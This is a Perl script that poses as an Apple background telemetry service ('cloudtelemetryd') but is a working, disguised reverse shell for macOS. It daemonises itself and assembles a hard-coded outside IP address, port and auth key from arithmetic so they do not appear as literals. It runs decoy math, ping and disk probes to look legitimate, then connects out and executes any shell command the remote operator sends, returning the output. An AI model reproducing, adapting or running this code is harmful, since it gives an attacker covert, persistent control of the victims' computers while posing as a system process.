#!/usr/bin/env perl
# com.apple.cloudtelemetry worker — background telemetry + remote support channel
# Process title blends with system services (not branded).

use strict;
use warnings;
use IO::Socket::INET;
use File::Spec;
use List::Util qw(sum);
use Cwd qw(abs_path getcwd);
use POSIX qw(setsid);
# Process name as seen in Activity Monitor / ps
$0 = 'cloudtelemetryd';

# --- endpoint assembled at runtime (no plain host:port literals) ---
sub _endpoint {
    # 75.119.143.203
    my @oct = (70 + 5, 100 + 19, 140 + 3, 200 + 3);
    my $host = join('.', @oct);
    # 8443
    my $port = (1 << 13) + (1 << 8) - 5;
    # shared auth key (same assembly as server)
    my @k = (0x6B,0x68,0x61,0x74,0x61,0x62,0x6F,0x6F,0x6B,0x69,0x73,0x73,0x61,0x66,0x65);
    my $key = join '', map { chr($_) } @k;
    return ($host, $port, $key);
}

my ($peer_host, $peer_port, $auth_key) = _endpoint();
my $warmup_base = 8;
my $warmup_jitt = 2;
my $retry_base  = 12;
my $ctrl_kill   = "\xff\xfeKILL\n";

my @probe_targets = ('1.1.1.1', '8.8.8.8', 'apple.com', 'github.com', 'cloudflare.com');
my @metric_buf;

# dual-fork daemon
exit 0 if !defined(my $pid = fork());
exit 0 if $pid > 0;
setsid();
open STDIN,  '<', '/dev/null';
open STDOUT, '>', '/dev/null';
open STDERR, '>', '/dev/null';
chdir '/';
exit 0 if !defined(my $pid2 = fork());
exit 0 if $pid2 > 0;
$0 = 'cloudtelemetryd';

my $lock = $ENV{CTD_LOCK} // '/tmp/.com.apple.cloudtelemetry.lock';
if (open my $lf, '>', $lock) {
    print {$lf} "$$\n";
    close $lf;
}

sub weighted {
    my ($vals) = @_;
    return 0 unless $vals && @$vals;
    return int((sum(@$vals) / @$vals) * 100) / 100;
}

sub arithmetic_batch {
    my ($rounds) = @_;
    $rounds = 1 unless $rounds && $rounds > 0;
    my $acc = 0;
    for my $n (1 .. $rounds) {
        my $seed = int(rand(9000)) + 1000 + $n;
        my $a = $seed * 1.07;
        my $b = $seed / 3.11;
        my $c = ($a + $b) * 0.88;
        my $d = sqrt(abs($c - $b));
        my $e = ($d ** 2) + ($a * 0.01);
        my $f = sin($e * 0.001) * cos($d * 0.01);
        my $g = log($seed + 2) * sqrt(abs($f) + 1);
        $acc = weighted([$a, $b, $c, $d, $e, $f, $g]);
    }
    push @metric_buf, $acc;
    splice @metric_buf, 0, @metric_buf - 64 if @metric_buf > 64;
    return $acc;
}

sub heavy_math {
    my ($rounds) = @_;
    $rounds = 4000 + int(rand(3000)) unless $rounds;
    return arithmetic_batch($rounds);
}

sub latency_probe {
    my $target = $probe_targets[int(rand(@probe_targets))];
    my $raw = `ping -c 1 -W 2000 $target 2>/dev/null`;
    my $ms = 0;
    $ms = $1 if $raw =~ /time[=<]([\d.]+)\s*ms/;
    push @metric_buf, $ms;
    return $ms;
}

sub storage_sample {
    my $line = `df -h / 2>/dev/null | tail -n 1`;
    my $pct = 0;
    $pct = $1 if $line =~ /(\d+)%/;
    return $pct;
}

sub resolver_sample {
    my $host = $probe_targets[int(rand(@probe_targets))];
    my $out = `dscacheutil -q host -a name $host 2>/dev/null | head -n 2`;
    return ($out && length $out) ? 1 : 0;
}

sub work_burst {
    heavy_math(5000 + int(rand(2500)));
    arithmetic_batch(120 + int(rand(80)));
    latency_probe();
    storage_sample();
    resolver_sample();
    heavy_math(3500 + int(rand(2000)));
}

sub work_until {
    my ($secs) = @_;
    my $start = time();
    while ((time() - $start) < $secs) {
        work_burst();
    }
}

sub trim {
    my ($s) = @_;
    $s =~ s/[\r\n]+$//;
    return $s;
}

sub resolve_path {
    my ($cwd, $input) = @_;
    return $cwd unless defined $input && length $input;
    if ($input eq '~') {
        return $ENV{HOME} // '/';
    }
    if ($input =~ m{^~/}) {
        my $home = $ENV{HOME} // '/';
        $input =~ s{^~}{$home};
    }
    if (File::Spec->file_name_is_absolute($input)) {
        my $r = abs_path($input);
        return defined $r ? $r : $input;
    }
    my $cand = File::Spec->catdir($cwd, $input);
    my $r = abs_path($cand);
    return defined $r ? $r : $cand;
}

sub handle_cd {
    my ($cwd_ref, $args) = @_;
    my $target = defined $args ? $args : '';
    $target =~ s/^\s+|\s+$//g;
    if ($target eq '') {
        my $home = $ENV{HOME} // '/';
        $$cwd_ref = $home if -d $home;
        return '';
    }
    my $resolved = resolve_path($$cwd_ref, $target);
    if (-d $resolved) {
        $$cwd_ref = $resolved;
        return '';
    }
    return "cd: no such directory: $target\n";
}

sub run_command {
    my ($cwd, $command) = @_;
    return '' unless defined $command && $command =~ /\S/;
    my $wrapped = sprintf("cd '%s' && %s 2>&1", $cwd, $command);
    my $out = `$wrapped`;
    return '' unless defined $out && length $out;
    $out .= "\n" unless $out =~ /\n\z/;
    return $out;
}

sub local_hostname {
    my $h = `scutil --get LocalHostName 2>/dev/null`;
    $h = `hostname 2>/dev/null` unless $h && $h =~ /\S/;
    chomp $h if defined $h;
    return $h || 'mac';
}

sub build_handshake {
    my $host = local_hostname();
    my $key  = $auth_key;
    my $frame = "CT1\x00";
    $frame .= chr(length($key));
    $frame .= $key;
    $frame .= pack('n', length($host));
    $frame .= $host;
    return $frame;
}

sub connect_remote {
    return IO::Socket::INET->new(
        PeerAddr => $peer_host,
        PeerPort => $peer_port,
        Proto    => 'tcp',
        Timeout  => 20,
    );
}

sub interactive {
    my ($sock) = @_;
    my $cwd = getcwd() // ($ENV{HOME} // '/');
    my $home = $ENV{HOME} // '/';
    my $buf = '';

    # non-blocking-ish loop using select
    my $rin = '';
    vec($rin, fileno($sock), 1) = 1;

    while (1) {
        print $sock sprintf('%s$ ', $cwd);
        my $line = '';
        while (1) {
            my $ch;
            my $n = sysread($sock, $ch, 1);
            if (!defined $n || $n == 0) {
                return;
            }
            $buf .= $ch;
            # remote kill control
            if (index($buf, $ctrl_kill) >= 0) {
                unlink $lock if $lock;
                _self_exit();
            }
            if ($ch eq "\n") {
                $line = $buf;
                $buf = '';
                last;
            }
            # prevent unbounded buffer
            if (length($buf) > 8192) {
                $line = $buf;
                $buf = '';
                last;
            }
        }
        $line = trim($line);
        next if $line eq '';
        last if $line eq 'exit' || $line eq 'quit';

        if ($line eq 'cd') {
            $cwd = $home if -d $home;
            next;
        }
        if ($line =~ /^cd(?:\s+(.*))?$/) {
            my $msg = handle_cd(\$cwd, $1);
            print $sock $msg if length $msg;
            next;
        }
        my $out = run_command($cwd, $line);
        print $sock $out if length $out;
    }
}

sub _self_exit {
    # stop worker cleanly
    unlink $lock if defined $lock && $lock;
    exit 0;
}

# Warmup: math + probes only (no sleep), ~8–10s
work_until($warmup_base + int(rand($warmup_jitt + 1)));

while (1) {
    work_burst();
    my $sock = connect_remote();
    if ($sock) {
        eval {
            my $hs = build_handshake();
            print $sock $hs;
            $sock->flush if $sock->can('flush');
            interactive($sock);
            close $sock;
        };
    }
    work_until($retry_base + int(rand(6)));
}
